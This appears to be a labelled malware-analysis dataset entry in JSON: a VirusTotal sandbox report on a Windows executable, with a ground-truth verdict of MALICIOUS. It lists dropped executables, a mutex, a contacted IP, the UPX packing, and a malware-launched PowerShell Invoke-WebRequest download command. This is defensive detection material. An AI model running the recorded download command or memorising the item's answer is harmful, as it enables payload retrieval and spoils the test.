@@ -1,0 +1,40 @@
+{
+  "hash": "18e95994664a94365fd30d117a18bd433972b1de049ebb3fc5a06b5a25730c09",
+  "report_text": "--- NETWORK ACTIVITY ---\n\nIP TRAFFIC (1):\n  3.120.98.217:8080 (TCP)\n\n--- EXECUTION CHAIN ---\n\nPROCESS TREE:\n  ab8b6c86e8c21812c14ab291f86b02da.virus.exe\n    C:\\Windows\\System\\oyLznzZ.exe\n    C:\\Windows\\System\\yiJxDju.exe\n    C:\\Windows\\System\\oVTIKGI.exe\n    C:\\Windows\\System\\xNmBywm.exe\n    powershell.exe -command Invoke-WebRequest https://raw.githubusercontent.com/ \n\n--- ARTIFACTS ---\n\nFILES DROPPED (4):\n  C:\\Windows\\System\\xNmBywm.exe  [sha256: b0ae6e4ac571a539...]\n  C:\\Windows\\System\\oVTIKGI.exe  [sha256: b0bb48eca9c4eceb...]\n  C:\\Windows\\System\\yiJxDju.exe  [sha256: 20278f5523176a8b...]\n  C:\\Windows\\System\\oyLznzZ.exe  [sha256: aa3f4bdaeffdb3b1...]\n\nMUTEXES CREATED (1):\n  sfdkjjhgkdsfhgjkjjsd\n\n--- FILE IDENTITY ---\n\nPE IMPORTS (DANGEROUS):\n  KERNEL32.DLL: GetProcAddress, VirtualProtect\n\nCOMPILER AND PACKER:\n  [Packer] UPX\n  [Compiler] Microsoft Visual C/C++\n  [Linker] Microsoft Linker\n  [Tool] Visual Studio\n\nPE SECTIONS (entropy):\n  UPX0         entropy=0.0\n  UPX1         entropy=7.9\n  .rsrc        entropy=4.22\n  [overlay]    entropy=5.700402736663818  size=457433\n",
+  "ground_truth": {
+    "hash": "18e95994664a94365fd30d117a18bd433972b1de049ebb3fc5a06b5a25730c09",
+    "verdict": "MALICIOUS",
+    "detection_rate": 0.831,
+    "malicious_count": 59,
+    "popular_threat_category": [],
+    "popular_threat_name": [],
+    "suggested_label": null,
+    "av_family_vote": "win32",
+    "has_family_label": false,
+    "ttps": [],
+    "capa_sig_names": [],
+    "iocs": {
+      "ips": [
+        "3.120.98.217"
+      ],
+      "domains": [],
+      "urls": [],
+      "registry_persistence": [],
+      "registry_all_count": 0,
+      "files_dropped": [
+        "C:\\Windows\\System\\oVTIKGI.exe",
+        "C:\\Windows\\System\\oyLznzZ.exe",
+        "C:\\Windows\\System\\xNmBywm.exe",
+        "C:\\Windows\\System\\yiJxDju.exe"
+      ],
+      "mutexes": [
+        "sfdkjjhgkdsfhgjkjjsd"
+      ],
+      "processes": []
+    }
+  },
+  "num_sandboxes": 1,
+  "sandbox_names": [
+    "VirusTotal Jujubox"
+  ]
+}
